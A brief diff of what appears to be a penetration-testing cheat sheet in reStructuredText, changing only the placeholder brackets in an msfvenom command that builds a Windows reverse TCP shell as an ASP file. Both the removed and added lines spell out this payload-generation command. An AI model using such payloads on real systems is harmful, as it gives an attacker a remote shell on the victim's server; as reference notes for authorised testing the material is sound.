@@ -3,7 +3,7 @@ msfvenom
 
 .. code-block:: shell
 
-	msfvenom -p windows/shell_reverse_tcp  HOST=[your_ip_address] LPORT=[Port] -f asp > shell.asp
+	msfvenom -p windows/shell_reverse_tcp  HOST=<your_ip_address> LPORT=[Port] -f asp > shell.asp
 
 .. code-block:: shell
 
